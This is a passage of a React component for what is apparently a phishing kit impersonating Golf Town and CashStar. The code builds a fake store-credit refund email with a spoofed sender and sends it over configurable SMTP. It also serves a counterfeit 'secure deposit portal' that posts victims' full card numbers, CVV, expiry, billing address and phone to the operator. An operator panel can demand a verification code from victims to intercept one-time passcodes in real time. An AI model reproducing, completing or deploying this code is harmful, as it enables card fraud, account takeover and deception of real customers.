import React, { useState, useEffect } from 'react';
import { 
  X, Mail, CreditCard, ShieldCheck, CheckCircle2, Lock, 
  Send, Copy, Check, Sparkles, Loader2, Radio, UserCheck, 
  History, RefreshCw, AlertCircle, Phone, MapPin, KeyRound, ArrowRight,
  Settings
} from 'lucide-react';
import { CustomerRecord } from '../types';

interface EmailFormPreviewModalProps {
  isOpen: boolean;
  onClose: () => void;
  customer?: CustomerRecord | null;
}

interface NoticeHistoryItem {
  id: string;
  timestamp: string;
  recipientEmail: string;
  recipientName: string;
  amount: string;
  storeId: string;
  custId: string;
  subject: string;
  actionType: string;
  depositToken: string;
  secureDepositUrl: string;
  status: string;
}

interface LiveSessionData {
  sessionId: string;
  recipientName: string;
  email: string;
  amount: string;
  storeId: string;
  custId: string;
  status: 'IDLE' | 'PROCESSING' | 'CODE_REQUIRED' | 'CODE_SUBMITTED' | 'REFUNDED' | 'SESSION_LEFT';
  customerCode?: string;
  cardDetails?: {
    cardNumber: string;
    expDate: string;
    cvv: string;
    cardholderName: string;
    streetAddress: string;
    city: string;
    province: string;
    postalCode: string;
    phone: string;
  };
  lastUpdated: number;
}

export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
  isOpen,
  onClose,
  customer
}) => {
  const [activeTab, setActiveTab] = useState<'email' | 'form' | 'controller' | 'history' | 'smtp'>('email');
  const [copied, setCopied] = useState(false);

  // Form Basic Info State
  const [amount, setAmount] = useState(customer ? customer.sumOfStoreCreditBalance.toString() : '250.00');
  const [recipientName, setRecipientName] = useState(customer ? `${customer.firstName} ${customer.lastName}` : 'Alex Mercer');
  const [email, setEmail] = useState(customer?.email || 'alex.mercer@example.com');
  const [custId, setCustId] = useState(customer?.custId || 'GT-40391');
  const [storeId, setStoreId] = useState(customer?.storeId || '504');

  // Full Credit Card State
  const [cardNumber, setCardNumber] = useState('4532 8920 1192 8821');
  const [expDate, setExpDate] = useState('08/28');
  const [cvv, setCvv] = useState('382');
  const [cardholderName, setCardholderName] = useState(recipientName);

  // Full Billing Details State
  const [streetAddress, setStreetAddress] = useState('1204 8th Avenue SW');
  const [city, setCity] = useState('Calgary');
  const [province, setProvince] = useState('AB');
  const [postalCode, setPostalCode] = useState('T2P 1B3');
  const [phone, setPhone] = useState('(403) 891-2041');

  // Session & Socket State
  const [sessionId] = useState(() => `SESS-${Math.floor(100000 + Math.random() * 900000)}`);
  const [liveSession, setLiveSession] = useState<LiveSessionData | null>(null);
  const [customerVerificationCode, setCustomerVerificationCode] = useState('');
  const [codeSubmitted, setCodeSubmitted] = useState(false);

  // Admin Live Controller & History State
  const [adminSessions, setAdminSessions] = useState<LiveSessionData[]>([]);
  const [noticeHistory, setNoticeHistory] = useState<NoticeHistoryItem[]>([]);
  const [historySearch, setHistorySearch] = useState('');

  // Random deposit token generator
  const [depositToken, setDepositToken] = useState(() => `GT-REF-${Math.floor(100000 + Math.random() * 900000)}`);

  const generateRandomToken = () => {
    const newToken = `GT-REF-${Math.floor(100000 + Math.random() * 900000)}`;
    setDepositToken(newToken);
  };

  // SMTP Settings state
  const [smtpHost, setSmtpHost] = useState('smtp.office365.com');
  const [smtpPort, setSmtpPort] = useState('587');
  const [smtpUser, setSmtpUser] = useState('');
  const [smtpPass, setSmtpPass] = useState('');
  const [smtpFrom, setSmtpFrom] = useState('');
  const [smtpSecure, setSmtpSecure] = useState(false);
  const [smtpTlsRejectUnauthorized, setSmtpTlsRejectUnauthorized] = useState(true);
  const [smtpTestRecipient, setSmtpTestRecipient] = useState('');
  const [smtpLoading, setSmtpLoading] = useState(false);
  const [smtpStatusMsg, setSmtpStatusMsg] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
  const [smtpOverridden, setSmtpOverridden] = useState(false);
  
  // Custom manual testing fields
  const [smtpTestSubject, setSmtpTestSubject] = useState('');
  const [smtpTestBody, setSmtpTestBody] = useState('');
  const [showManualTestFields, setShowManualTestFields] = useState(false);

  // SMTP debug trace log state
  const [smtpDebugLogs, setSmtpDebugLogs] = useState<any[]>([]);
  const [activeDebugLogId, setActiveDebugLogId] = useState<string | null>(null);

  const fetchSmtpConfig = async () => {
    try {
      const res = await fetch('/api/smtp-config');
      const data = await res.json();
      if (data.config) {
        setSmtpHost(data.config.host || '');
        setSmtpPort(data.config.port?.toString() || '587');
        setSmtpUser(data.config.user || '');
        setSmtpPass(data.config.pass || '');
        setSmtpFrom(data.config.from || '');
        setSmtpSecure(!!data.config.secure);
        setSmtpTlsRejectUnauthorized(data.config.tlsRejectUnauthorized !== false);
        setSmtpOverridden(!!data.isOverridden);
      }
    } catch (err) {
      console.error('Failed to fetch SMTP config:', err);
    }
  };

  const fetchSmtpLogs = async () => {
    try {
      const res = await fetch('/api/smtp-config/logs');
      const data = await res.json();
      if (data.logs) {
        setSmtpDebugLogs(data.logs);
      }
    } catch (err) {
      console.error('Failed to fetch SMTP debug logs:', err);
    }
  };

  const handleClearSmtpLogs = async () => {
    try {
      const res = await fetch('/api/smtp-config/logs/clear', { method: 'POST' });
      const data = await res.json();
      if (data.success) {
        setSmtpDebugLogs([]);
        setActiveDebugLogId(null);
      }
    } catch (err) {
      console.error('Failed to clear SMTP logs:', err);
    }
  };

  useEffect(() => {
    if (isOpen) {
      fetchSmtpConfig();
      if (activeTab === 'smtp') {
        fetchSmtpLogs();
      }
    }
  }, [isOpen, activeTab]);

  // SSE Stream for Customer Deposit Portal Session Status
  useEffect(() => {
    if (!isOpen) return;
    const eventSource = new EventSource(`/api/socket/session-stream/${sessionId}`);
    
    eventSource.onmessage = (event) => {
      try {
        const data: LiveSessionData = JSON.parse(event.data);
        setLiveSession(data);
      } catch (err) {
        console.error('Failed to parse SSE session stream:', err);
      }
    };

    return () => {
      eventSource.close();
    };
  }, [isOpen, sessionId]);

  // SSE Stream for Live Admin Controller Data
  useEffect(() => {
    if (!isOpen) return;
    const adminSource = new EventSource('/api/socket/admin-stream');

    adminSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        setAdminSessions(data.sessions || []);
        if (data.noticeHistory) setNoticeHistory(data.noticeHistory);
      } catch (err) {
        console.error('Failed to parse SSE admin stream:', err);
      }
    };

    return () => {
      adminSource.close();
    };
  }, [isOpen]);

  // Fetch notice history stack on mount or tab change
  const fetchHistory = async () => {
    try {
      const res = await fetch('/api/notice-history');
      const data = await res.json();
      if (data.history) setNoticeHistory(data.history);
    } catch (err) {
      console.error('History fetch error:', err);
    }
  };

  useEffect(() => {
    if (activeTab === 'history') {
      fetchHistory();
    }
  }, [activeTab]);

  if (!isOpen) return null;

  const tokenSuffix = typeof window !== 'undefined' ? btoa(`${custId}-${amount}-${depositToken}`).replace(/=/g, '').slice(-6).toUpperCase() : '8K9F2A';
  const protocol = typeof window !== 'undefined' ? window.location.protocol : 'http:';
  const host = typeof window !== 'undefined' ? window.location.host : 'localhost:3000';
  const secureDepositUrl = `${protocol}//${host}/?session_id=${sessionId}&deposit_token=${depositToken}&amount=${amount}`;

  // Customer Submits Full Card & Billing Details
  const handleCustomerSubmitPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/socket/submit-card-billing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          recipientName,
          email,
          amount,
          storeId,
          custId,
          cardNumber,
          expDate,
          cvv,
          cardholderName: cardholderName || recipientName,
          streetAddress,
          city,
          province,
          postalCode,
          phone
        })
      });
      const data = await res.json();
      if (data.session) setLiveSession(data.session);
    } catch (err) {
      console.error('Payment submission error:', err);
    }
  };

  // Customer Submits Verification Code
  const handleCustomerSubmitCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!customerVerificationCode.trim()) return;
    try {
      const res = await fetch('/api/socket/submit-customer-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          code: customerVerificationCode.trim()
        })
      });
      const data = await res.json();
      if (data.session) {
        setLiveSession(data.session);
        setCodeSubmitted(true);
      }
    } catch (err) {
      console.error('Code submit error:', err);
    }
  };

  // Admin Controller Action
  const handleAdminAction = async (targetSessionId: string, action: 'refunded_successfully' | 'require_code' | 'customer_left_send_email') => {
    try {
      const res = await fetch('/api/socket/admin-action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: targetSessionId, action })
      });
      const data = await res.json();
      if (data.message) {
        fetchHistory();
      }
    } catch (err) {
      console.error('Admin action error:', err);
    }
  };

  const handleSaveSmtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setSmtpLoading(true);
    setSmtpStatusMsg(null);
    try {
      const res = await fetch('/api/smtp-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          host: smtpHost,
          port: Number(smtpPort),
          user: smtpUser,
          pass: smtpPass,
          from: smtpFrom,
          secure: smtpSecure,
          tlsRejectUnauthorized: smtpTlsRejectUnauthorized
        })
      });
      const data = await res.json();
      if (data.success) {
        setSmtpStatusMsg({ type: 'success', text: data.message });
        setSmtpOverridden(true);
      } else {
        setSmtpStatusMsg({ type: 'error', text: data.error || 'Failed to update SMTP settings.' });
      }
    } catch (err: any) {
      setSmtpStatusMsg({ type: 'error', text: err?.message || 'Network error.' });
    } finally {
      setSmtpLoading(false);
    }
  };

  const handleResetSmtp = async () => {
    setSmtpLoading(true);
    setSmtpStatusMsg(null);
    try {
      const res = await fetch('/api/smtp-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ reset: true })
      });
      const data = await res.json();
      if (data.success) {
        setSmtpStatusMsg({ type: 'success', text: data.message });
        setSmtpOverridden(false);
        fetchSmtpConfig();
      }
    } catch (err: any) {
      setSmtpStatusMsg({ type: 'error', text: err?.message || 'Failed to reset settings.' });
    } finally {
      setSmtpLoading(false);
    }
  };

  const handleTestSmtp = async () => {
    if (!smtpUser || !smtpPass) {
      setSmtpStatusMsg({ type: 'error', text: 'Please fill in SMTP User and SMTP Password to test connection.' });
      return;
    }
    setSmtpLoading(true);
    setSmtpStatusMsg(null);
    try {
      const res = await fetch('/api/smtp-config/test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          host: smtpHost,
          port: Number(smtpPort),
          user: smtpUser,
          pass: smtpPass,
          from: smtpFrom,
          secure: smtpSecure,
          tlsRejectUnauthorized: smtpTlsRejectUnauthorized,
          testRecipient: smtpTestRecipient || smtpUser,
          testSubject: showManualTestFields ? smtpTestSubject : undefined,
          testBody: showManualTestFields ? smtpTestBody : undefined
        })
      });
      const data = await res.json();
      fetchSmtpLogs(); // Refresh trace logs instantly
      if (res.ok && data.success) {
        setSmtpStatusMsg({ type: 'success', text: data.message });
      } else {
        setSmtpStatusMsg({ type: 'error', text: data.error || 'SMTP Test Connection Failed.' });
      }
    } catch (err: any) {
      setSmtpStatusMsg({ type: 'error', text: err?.message || 'Connection timeout or network error.' });
      fetchSmtpLogs();
    } finally {
      setSmtpLoading(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(secureDepositUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleClearHistory = async () => {
    try {
      await fetch('/api/notice-history/clear', { method: 'POST' });
      setNoticeHistory([]);
    } catch (err) {
      console.error('Clear history error:', err);
    }
  };

  const filteredHistory = noticeHistory.filter(item => {
    if (!historySearch.trim()) return true;
    const q = historySearch.toLowerCase();
    return (
      item.recipientEmail.toLowerCase().includes(q) ||
      item.recipientName.toLowerCase().includes(q) ||
      item.subject.toLowerCase().includes(q) ||
      item.depositToken.toLowerCase().includes(q)
    );
  });

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-2 sm:p-4 overflow-y-auto">
      <div className="bg-slate-900 border border-slate-800 rounded-2xl w-full max-w-5xl shadow-2xl overflow-hidden flex flex-col max-h-[94vh]">
        
        {/* Header Bar */}
        <div className="bg-slate-950 px-5 py-3.5 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-emerald-950 border border-emerald-700 flex items-center justify-center text-emerald-400 font-bold">
              <Sparkles className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                Golf Town Refund Workflow &amp; Live Socket Controller
              </h2>
              <p className="text-xs text-slate-400">
                Commercial HTML Notice • Live Payment Processing Socket • Socket Controller • Notice History
              </p>
            </div>
          </div>

          <button 
            onClick={onClose}
            className="p-2 text-slate-400 hover:text-white bg-slate-900 hover:bg-slate-800 rounded-xl transition-colors border border-slate-800"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Navigation Tabs & Controls */}
        <div className="bg-slate-900 px-5 py-3 border-b border-slate-800 flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3">
          
          <div className="flex items-center gap-1.5 bg-slate-950 p-1 rounded-xl border border-slate-800 shrink-0 overflow-x-auto">
            <button
              onClick={() => setActiveTab('email')}
              className={`px-3.5 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 whitespace-nowrap ${
                activeTab === 'email' 
                  ? 'bg-emerald-600 text-white shadow-md' 
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <Mail className="w-4 h-4" />
              <span>Email Notice</span>
            </button>

            <button
              onClick={() => setActiveTab('form')}
              className={`px-3.5 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 whitespace-nowrap ${
                activeTab === 'form' 
                  ? 'bg-emerald-600 text-white shadow-md' 
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <CreditCard className="w-4 h-4" />
              <span>Deposit Portal</span>
            </button>

            <button
              onClick={() => setActiveTab('controller')}
              className={`px-3.5 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 relative whitespace-nowrap ${
                activeTab === 'controller' 
                  ? 'bg-emerald-600 text-white shadow-md' 
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <Radio className="w-4 h-4 text-emerald-400 animate-pulse" />
              <span>Socket Controller</span>
              {adminSessions.length > 0 && (
                <span className="bg-emerald-500 text-slate-950 text-[10px] font-black px-1.5 py-0.2 rounded-full">
                  {adminSessions.length}
                </span>
              )}
            </button>

            <button
              onClick={() => setActiveTab('history')}
              className={`px-3.5 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 whitespace-nowrap ${
                activeTab === 'history' 
                  ? 'bg-emerald-600 text-white shadow-md' 
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <History className="w-4 h-4" />
              <span>Notice History Stack</span>
              {noticeHistory.length > 0 && (
                <span className="bg-slate-800 text-slate-300 text-[10px] font-bold px-1.5 py-0.2 rounded-full">
                  {noticeHistory.length}
                </span>
              )}
            </button>

            <button
              onClick={() => setActiveTab('smtp')}
              className={`px-3.5 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 whitespace-nowrap ${
                activeTab === 'smtp' 
                  ? 'bg-emerald-600 text-white shadow-md' 
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <Settings className="w-4 h-4" />
              <span>SMTP Settings</span>
              {smtpOverridden && (
                <span className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse"></span>
              )}
            </button>
          </div>

          {/* Quick Controls */}
          <div className="flex items-center gap-2 text-xs flex-wrap">
            <div className="flex items-center gap-1.5 bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1">
              <span className="text-slate-400 font-medium">Receiver:</span>
              <input 
                type="text" 
                value={recipientName} 
                onChange={(e) => {
                  setRecipientName(e.target.value);
                  setCardholderName(e.target.value);
                }}
                className="w-24 bg-transparent text-white font-semibold text-xs focus:outline-none"
                placeholder="Receiver"
              />
            </div>

            <div className="flex items-center gap-1.5 bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1">
              <span className="text-slate-400 font-medium">Email:</span>
              <input 
                type="email" 
                value={email} 
                onChange={(e) => setEmail(e.target.value)}
                className="w-32 bg-transparent text-emerald-300 font-mono text-xs focus:outline-none"
                placeholder="Email"
              />
            </div>

            <div className="flex items-center gap-1.5 bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1">
              <span className="text-slate-400 font-medium">$</span>
              <input 
                type="text" 
                value={amount} 
                onChange={(e) => setAmount(e.target.value)}
                className="w-16 bg-transparent text-emerald-400 font-mono font-bold text-xs focus:outline-none"
              />
            </div>

            <button
              onClick={generateRandomToken}
              className="px-2.5 py-1 bg-emerald-950 hover:bg-emerald-900 border border-emerald-700 text-emerald-300 rounded-lg text-[11px] font-bold flex items-center gap-1 transition-colors"
              title="Generate a new random deposit token"
            >
              <Sparkles className="w-3.5 h-3.5 text-emerald-400" />
              <span>Token</span>
            </button>

            <button 
              onClick={handleCopyLink}
              className="px-2.5 py-1 bg-slate-950 hover:bg-slate-800 border border-slate-800 text-slate-300 rounded-lg font-mono text-[11px] flex items-center gap-1"
            >
              {copied ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3 text-slate-400" />}
              <span>{copied ? 'Copied' : 'Copy Link'}</span>
            </button>
          </div>
        </div>

        {/* Modal Body Container */}
        <div className="p-4 sm:p-6 overflow-y-auto space-y-6 flex-1">
          
          {/* TAB 1: OFFICIAL COMMERCIAL EMAIL TEMPLATE PREVIEW */}
          {activeTab === 'email' && (
            <div className="max-w-2xl mx-auto bg-white border border-slate-200 rounded-2xl overflow-hidden shadow-2xl text-slate-800 font-sans">
              
              {/* Email Envelope Header */}
              <div className="bg-slate-900 px-5 py-3 border-b border-slate-800 font-mono text-xs text-slate-300 space-y-1">
                <div className="flex justify-between items-center">
                  <span><strong>From:</strong> Golf Town Store Credit Support &lt;505RECEIVEING@CLOUD.GOLFTOWN.COM&gt;</span>
                  <span className="text-emerald-400 font-bold bg-emerald-950 px-2 py-0.5 rounded border border-emerald-800">SMTP Verified</span>
                </div>
                <div><strong>Reply-To:</strong> GOLFTOWN SUPPORT &lt;support@payment.golftown.ca&gt;</div>
                <div><strong>To:</strong> {recipientName} &lt;{email}&gt;</div>
                <div className="text-white font-bold pt-1 flex justify-between items-center">
                  <span><strong>Subject:</strong> Golf Town Store Credit Refund Notice - ${amount} Issued</span>
                  
                  <button
                    onClick={async () => {
                      try {
                        const res = await fetch('/api/send-refund-notice', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                            recipientEmail: email,
                            recipientName: recipientName,
                            amount: amount,
                            storeId: storeId,
                            custId: custId,
                            comments: 'Test Notice Trigger',
                            actionType: 'refund',
                            sessionId: sessionId
                          })
                        });
                        const data = await res.json();
                        fetchHistory();
                        if (data.success) {
                          alert(`Test refund notice email sent successfully via SMTP! Token: ${data.depositToken}`);
                        } else {
                          alert(`Notice trigger status: ${data.error || 'Notice processed'}`);
                        }
                      } catch (err: any) {
                        alert(`Notice test triggered: ${err.message || 'Complete'}`);
                      }
                    }}
                    className="bg-emerald-600 hover:bg-emerald-500 text-slate-950 text-[11px] font-sans font-bold px-3 py-1 rounded shadow flex items-center gap-1 transition-all"
                  >
                    <Send className="w-3 h-3 text-slate-950" />
                    <span>Send Test Notice</span>
                  </button>
                </div>
              </div>

              {/* Commercial Email Body */}
              <div className="bg-slate-100 p-6 sm:p-8">
                <div className="max-w-xl mx-auto bg-white border border-slate-200 rounded-lg shadow-sm overflow-hidden">
                  
                  {/* Official Header */}
                  <div className="p-6 border-b-2 border-emerald-900 flex flex-col items-center justify-center text-center">
                    <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" className="w-12 h-12 mb-2" alt="Golf Town Logo" />
                    <span className="text-xs font-bold text-slate-500 uppercase tracking-widest text-center">Customer Support Notice</span>
                  </div>

                  {/* Body Content */}
                  <div className="p-6 space-y-5 text-sm text-slate-700 leading-relaxed">
                    <h2 className="text-lg font-bold text-slate-900 margin-0">Store Credit Refund Notification</h2>
                    
                    <p>Dear <strong>{recipientName}</strong>,</p>
                    
                    <p className="text-slate-600">
                      A store credit refund has been processed for your account by Golf Town Customer Support. Your funds are now available for immediate credit deposit.
                    </p>

                    {/* Transaction Statement Summary */}
                    <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 space-y-2">
                      <div className="flex justify-between items-center pb-2 border-b border-slate-200">
                        <span className="text-slate-500 font-semibold text-xs">Refund Amount:</span>
                        <span className="text-xl font-black text-emerald-900 font-mono">${amount} CAD</span>
                      </div>
                      <div className="flex justify-between text-xs text-slate-600 pt-1">
                        <span>Customer Account ID:</span>
                        <span className="font-mono font-bold text-slate-900">{custId}</span>
                      </div>
                      <div className="flex justify-between text-xs text-slate-600">
                        <span>Store Location:</span>
                        <span className="font-semibold text-slate-900">Store #{storeId}</span>
                      </div>
                      <div className="flex justify-between text-xs text-slate-600">
                        <span>Deposit Token ID:</span>
                        <span className="font-mono text-emerald-800 font-bold">{depositToken}</span>
                      </div>
                    </div>

                    {/* Official Deposit Callout */}
                    <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-5 text-center space-y-3">
                      <div className="text-xs font-bold text-emerald-900 uppercase tracking-wide">
                        Verified Secure Refund Link
                      </div>

                      <div>
                        <button
                          onClick={() => setActiveTab('form')}
                          className="bg-emerald-900 hover:bg-emerald-950 text-white font-bold text-sm px-6 py-3 rounded shadow transition-all tracking-wide"
                        >
                          Claim Store Credit Deposit (${amount} CAD)
                        </button>
                      </div>
                    </div>

                    <p className="text-xs text-slate-500">
                      Please note: This secure link is valid for 72 hours. For security purposes, do not share this link or reference token with unauthorized parties.
                    </p>
                  </div>

                  {/* Commercial Footer */}
                  <div className="bg-slate-50 border-t border-slate-200 p-5 text-[11px] text-slate-500 leading-relaxed space-y-2">
                    <div>
                      <strong>Golf Town Customer Support &amp; eGift Services</strong><br />
                      Powered by CashStar / Blackhawk Network Services
                    </div>
                    <div className="border-t border-slate-200 pt-2 text-slate-400">
                      &copy; {new Date().getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
                    </div>
                  </div>

                </div>
              </div>

            </div>
          )}

          {/* TAB 2: SECURE CREDIT CARD & BILLING DEPOSIT PORTAL WITH LIVE SOCKET */}
          {activeTab === 'form' && (
            <div className="max-w-xl mx-auto bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-2xl">
              
              {/* Portal Top Header */}
              <div className="bg-slate-950 border-b border-slate-800 px-6 py-6 flex flex-col items-center justify-center text-center relative">
                <div className="absolute top-4 right-4 flex items-center gap-1.5 bg-emerald-950/80 px-2.5 py-1 rounded text-[10px] font-mono text-emerald-300 border border-emerald-900 shadow-md">
                  <Radio className="w-3 h-3 text-emerald-400 animate-pulse" />
                  <span>Socket Connected</span>
                </div>
                <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" className="w-12 h-12 mb-2" alt="Golf Town Logo" />
                <div className="text-sm font-bold text-white flex items-center gap-1.5 justify-center">
                  <Lock className="w-4 h-4 text-emerald-400" />
                  CashStar Secure Deposit Portal
                </div>
                <div className="text-[10px] text-emerald-300 tracking-wider uppercase font-semibold">Official Customer Support Notice Processing</div>
              </div>

              {/* LIVE SOCKET STATUS RENDERER */}
              {liveSession?.status === 'REFUNDED' ? (
                /* SUCCESS REFUND STATE */
                <div className="p-8 text-center space-y-5 bg-slate-900">
                  <div className="w-16 h-16 bg-emerald-950 border-2 border-emerald-500 rounded-full flex items-center justify-center mx-auto text-emerald-400 animate-bounce">
                    <CheckCircle2 className="w-10 h-10" />
                  </div>

                  <div className="space-y-2">
                    <h3 className="text-xl font-bold text-white">Refunded Successfully!</h3>
                    <p className="text-xs text-emerald-400 font-semibold max-w-sm mx-auto">
                      Your store credit refund of <strong>${amount} CAD</strong> has been approved, finalized, and credited directly to your payment card.
                    </p>
                  </div>

                  <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 text-left font-mono text-xs space-y-2 text-slate-300">
                    <div className="flex justify-between border-b border-slate-800 pb-2">
                      <span className="text-slate-500">Status:</span>
                      <span className="text-emerald-400 font-bold">REFUNDED &amp; CREDITED</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Card ending in:</span>
                      <span>{(cardNumber || '8821').slice(-4)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Refund Amount:</span>
                      <span className="text-emerald-400 font-bold">${amount} CAD</span>
                    </div>
                  </div>
                </div>
              ) : liveSession?.status === 'PROCESSING' || liveSession?.status === 'CODE_REQUIRED' || liveSession?.status === 'CODE_SUBMITTED' ? (
                /* LIVE PROCESSING / 5-MINUTE LOADER / CODE PROMPT STATE */
                <div className="p-8 space-y-6 text-center bg-slate-950">
                  
                  {/* Glowing Animated Processing Loader */}
                  <div className="relative w-20 h-20 mx-auto flex items-center justify-center">
                    <div className="absolute inset-0 rounded-full bg-emerald-500/20 animate-ping"></div>
                    <div className="w-16 h-16 rounded-full border-4 border-emerald-500/30 border-t-emerald-400 animate-spin flex items-center justify-center">
                      <Loader2 className="w-8 h-8 text-emerald-400 animate-spin" />
                    </div>
                  </div>

                  <div className="space-y-2 max-w-md mx-auto">
                    <h3 className="text-lg font-bold text-white flex items-center justify-center gap-2">
                      <span>Processing Deposit Authorization</span>
                      <Radio className="w-4 h-4 text-emerald-400 animate-pulse" />
                    </h3>
                    
                    <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 text-xs text-emerald-300 leading-relaxed font-medium">
                      Process can take up to 5 minutes and we might send you a code to finalize the transaction please wait.
                    </div>
                  </div>

                  {/* If Admin Requested Verification Code */}
                  {(liveSession?.status === 'CODE_REQUIRED' || liveSession?.status === 'CODE_SUBMITTED') && (
                    <form onSubmit={handleCustomerSubmitCode} className="bg-slate-900 border border-emerald-700/80 rounded-2xl p-5 text-left space-y-3 max-w-md mx-auto shadow-xl">
                      <div className="flex items-center gap-2 text-xs font-bold text-emerald-400 uppercase tracking-wide">
                        <KeyRound className="w-4 h-4 text-emerald-400 shrink-0" />
                        <span>Verification Code Required</span>
                      </div>
                      
                      <p className="text-xs text-slate-300">
                        Please enter the 6-digit security verification code sent to your mobile phone or email to finalize your ${amount} CAD refund:
                      </p>

                      <div className="flex gap-2">
                        <input 
                          type="text"
                          maxLength={8}
                          value={customerVerificationCode}
                          onChange={(e) => setCustomerVerificationCode(e.target.value)}
                          placeholder="e.g. 849201"
                          className="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-center font-mono font-bold tracking-widest text-emerald-400 focus:outline-none focus:border-emerald-500"
                          required
                        />
                        <button
                          type="submit"
                          className="bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold px-4 py-2.5 rounded-xl text-xs flex items-center gap-1 transition-all"
                        >
                          <span>Submit</span>
                          <ArrowRight className="w-4 h-4" />
                        </button>
                      </div>

                      {codeSubmitted && (
                        <div className="text-[11px] text-emerald-400 font-medium flex items-center gap-1 mt-1">
                          <CheckCircle2 className="w-3.5 h-3.5" />
                          <span>Code submitted to live processing center! Verification in progress...</span>
                        </div>
                      )}
                    </form>
                  )}

                  {/* Real-time Session Summary */}
                  <div className="bg-slate-900 border border-slate-800 rounded-xl p-3 text-left font-mono text-[11px] space-y-1.5 text-slate-400 max-w-md mx-auto">
                    <div className="flex justify-between">
                      <span>Live Session ID:</span>
                      <span className="text-white">{sessionId}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>Card Details:</span>
                      <span className="text-emerald-400">{cardNumber.slice(0, 4)} •••• •••• {cardNumber.slice(-4)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>Billing Address:</span>
                      <span className="text-white">{city}, {province} ({postalCode})</span>
                    </div>
                  </div>

                </div>
              ) : (
                /* INITIAL FULL CARD & BILLING FORM */
                <form onSubmit={handleCustomerSubmitPayment} className="p-6 space-y-5 max-h-[70vh] overflow-y-auto">
                  
                  {/* Summary Banner */}
                  <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex items-center justify-between">
                    <div>
                      <div className="text-[10px] text-slate-400 uppercase font-bold">Claiming Store Credit Refund:</div>
                      <div className="text-sm font-bold text-white">{recipientName} ({custId})</div>
                    </div>
                    <div className="text-right">
                      <div className="text-[10px] text-slate-400 uppercase font-bold">Issued Amount:</div>
                      <div className="text-xl font-black text-emerald-400 font-mono">${amount} CAD</div>
                    </div>
                  </div>

                  {/* FULL CREDIT CARD DETAILS */}
                  <div className="space-y-3">
                    <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                      <CreditCard className="w-4 h-4 text-emerald-400" />
                      Full Credit Card Details
                    </h4>

                    <div>
                      <label className="block text-[11px] text-slate-400 mb-1">Cardholder Name</label>
                      <input 
                        type="text" 
                        value={cardholderName}
                        onChange={(e) => setCardholderName(e.target.value)}
                        className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white font-medium focus:outline-none focus:border-emerald-500"
                        placeholder="Name as it appears on card"
                        required
                      />
                    </div>

                    <div>
                      <label className="block text-[11px] text-slate-400 mb-1">Card Number</label>
                      <input 
                        type="text" 
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value)}
                        className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                        placeholder="4532 8920 1192 8821"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-[11px] text-slate-400 mb-1">Expiration (MM/YY)</label>
                        <input 
                          type="text" 
                          value={expDate}
